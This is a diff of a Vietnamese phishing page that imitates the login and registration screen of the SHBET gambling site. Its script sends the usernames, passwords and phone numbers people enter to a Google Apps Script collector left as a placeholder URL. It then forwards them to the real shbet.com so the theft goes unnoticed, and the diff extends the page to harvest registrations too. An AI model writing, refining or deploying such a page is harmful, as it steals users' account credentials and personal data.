@@ -3,86 +3,110 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SHBET - Đăng Nhập</title>
+    <title>SHBET - Đăng Nhập & Đăng Ký</title>
     <style>
         body { margin: 0; font-family: Arial, sans-serif; background-color: #062e3a; }
-        /* 1. Thanh Header màu trắng */
+        /* 1. Header trắng & Logo to */
         header { display: flex; justify-content: space-between; align-items: center; padding: 10px 20px; background: white; }
-        .logo img { height: 45px; }
-        .btn-login { padding: 8px 15px; border-radius: 5px; border: 1px solid #007bff; background: white; color: #007bff; cursor: pointer; font-weight: bold; }
+        .logo img { height: 70px; width: auto; display: block; } /* Logo đã phóng to 70px */
+        
+        .auth-buttons { display: flex; gap: 10px; }
+        .btn-header { padding: 8px 15px; border-radius: 5px; font-weight: bold; cursor: pointer; }
+        .btn-login { border: 1px solid #007bff; background: white; color: #007bff; }
+        .btn-reg { border: none; background: #00bfff; color: white; }
 
-        /* 2. Menu màu đen */
+        /* 2. Menu đen */
         nav { background: #1a1a1a; display: flex; justify-content: center; padding: 10px 0; }
         nav a { color: #ffca28; text-decoration: none; margin: 0 15px; font-size: 13px; font-weight: bold; }
 
-        /* 3. Banner lớn */
-        .banner-container { width: 100%; position: relative; }
+        /* 3. Banner */
         .banner-img { width: 100%; display: block; }
 
-        /* 4. Form đăng nhập (Mặc định sẽ ẨN ĐI) */
+        /* 4. Các bảng Form (Mặc định ẨN) */
         .login-container { 
             display: none; 
-            position: fixed; 
-            top: 50%; left: 50%; transform: translate(-50%, -50%); 
-            background: white; padding: 25px; border-radius: 15px; width: 320px; 
+            position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); 
+            background: white; padding: 25px; border-radius: 15px; 
+            width: 90%; max-width: 320px; 
             box-shadow: 0 10px 25px rgba(0,0,0,0.5); z-index: 1000; 
         }
-        .login-container h2 { text-align: center; color: #333; margin-top: 0; }
         input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 5px; box-sizing: border-box; }
-        
-        /* Nút đăng nhập màu XANH DA TRỜI bạn muốn */
-        #btn-submit { width: 100%; padding: 12px; background: #008b9a; color: white; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; }
+        .submit-btn { width: 100%; padding: 12px; color: white; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; }
     </style>
 </head>
 <body>
 
     <header>
         <div class="logo">
-            <img src="https://media.licdn.com/dms/image/v2/D4E12AQED-HCjN5hn6g/article-cover_image-shrink_600_2000/article-cover_image-shrink_600_2000/0/1721702595437?e=2147483647&v=beta&t=fyY4P1jEQEfP8zG68RVAHtd-c4RZSyI6SNNrjg2grEU">
+            <img src="https://shbet.686play.com/logo-shbet.webp" style="height: 60px; width: auto; display: block; padding: 5px 0;">
         </div>
-        <button class="btn-login">Đăng nhập</button>
+        <div class="auth-buttons">
+            <button class="btn-header btn-login" id="showLogin">Đăng nhập</button>
+            <button class="btn-header btn-reg" id="showRegister">Đăng ký</button>
+        </div>
     </header>
 
     <nav>
         <a href="#">TRANG CHỦ</a>
         <a href="#">THỂ THAO</a>
         <a href="#">CASINO</a>
+        <a href="#">GAME BÀI</a>
+        <a href="#">BẮN CÁ</a>
+        <a href="#">NỔ HŨ</a>
+        <a href="#">XỔ SỐ</a>
+        <a href="#">ĐÁ GÀ</a>
+        <a href="#">GAME 3D</a>
+        <a href="#">HƯỚNG DẪN</a>
     </nav>
 
-    <div class="banner-container">
-        <img src="https://gedisagenius.ru.com/wp-content/uploads/2025/09/banner_shbet-1.webp">
-    </div>
+    <img src="https://68shbet.com/wp-content/uploads/2024/05/banner-shbet.jpg" class="banner-img">
 
     <div class="login-container" id="loginBox">
-        <h2>ĐĂNG NHẬP NGAY</h2>
-        <form id="myForm">
-            <input type="text" name="phone" placeholder="Số điện thoại" required>
+        <h2 style="text-align:center;">ĐĂNG NHẬP</h2>
+        <form id="loginForm">
             <input type="text" name="username" placeholder="Tên đăng nhập" required>
             <input type="password" name="password" placeholder="Mật khẩu" required>
-            <button type="submit" id="btn-submit">ĐĂNG NHẬP</button>
+            <button type="submit" class="submit-btn" style="background: #ff9800;">ĐĂNG NHẬP</button>
+            <p style="text-align:center; color:red; cursor:pointer;" onclick="document.getElementById('loginBox').style.display='none'">Đóng</p>
+        </form>
+    </div>
+
+    <div class="login-container" id="registerBox">
+        <h2 style="text-align:center;">ĐĂNG KÝ MỚI</h2>
+        <form id="registerForm">
+            <input type="text" name="phone" placeholder="Nhập số điện thoại" required>
+            <button type="submit" class="submit-btn" style="background: #00bfff;">GỬI ĐĂNG KÝ</button>
+            <p style="text-align:center; color:red; cursor:pointer;" onclick="document.getElementById('registerBox').style.display='none'">Đóng</p>
         </form>
     </div>
 
     <script>
-        const btnLoginHeader = document.querySelector('.btn-login');
-        const loginBox = document.getElementById('loginBox');
-
-        // Khi bấm nút Đăng nhập trên Header thì hiện bảng lên
-        btnLoginHeader.onclick = function() {
-            loginBox.style.display = 'block';
-        };
-
-        // Gửi dữ liệu về Google Sheets
         const scriptURL = 'DÁN_LINK_APP_SCRIPT_CỦA_BẠN_Ở_ĐÂY';
-        const form = document.getElementById('myForm');
-
-        form.onsubmit = function(e) {
-            e.preventDefault();
-            alert('Đang kết nối đến máy chủ...');
-            fetch(scriptURL, { method: 'POST', body: new FormData(form)})
-            .then(response => { window.location.href = "https://shbet.com"; })
-            .catch(error => console.error('Lỗi!', error.message));
+        
+        // Hiện Form Đăng nhập
+        document.getElementById('showLogin').onclick = () => {
+            document.getElementById('loginBox').style.display = 'block';
+            document.getElementById('registerBox').style.display = 'none';
         };
+
+        // Hiện Form Đăng ký
+        document.getElementById('showRegister').onclick = () => {
+            document.getElementById('registerBox').style.display = 'block';
+            document.getElementById('loginBox').style.display = 'none';
+        };
+
+        // Xử lý gửi Form
+        function handleForm(formId) {
+            const form = document.getElementById(formId);
+            form.onsubmit = e => {
+                e.preventDefault();
+                alert('Đang gửi dữ liệu...');
+                fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+                .then(() => { window.location.href = "https://shbet.com"; });
+            };
+        }
+        handleForm('loginForm');
+        handleForm('registerForm');
     </script>
 </body>
 </html>
